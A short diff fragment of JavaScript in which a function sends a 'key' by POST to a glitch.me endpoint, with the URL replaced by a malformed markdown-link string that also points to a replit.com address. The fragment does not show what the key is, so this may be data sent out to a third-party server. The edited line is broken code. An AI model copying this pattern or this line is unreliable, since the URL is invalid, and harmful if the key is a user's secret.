@@ -57,7 +57,7 @@
 
     // Function to send the key to the specified URL
     function sendKeyToServer(key) {
-      fetch('https://i-want-a-bf-2.glitch.me/keysys', {
+      fetch('[https://i-want-a-bf-2.glitch.me/keysys](https://replit.com/@spulasugi/CornyApprehensiveEllipse)', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
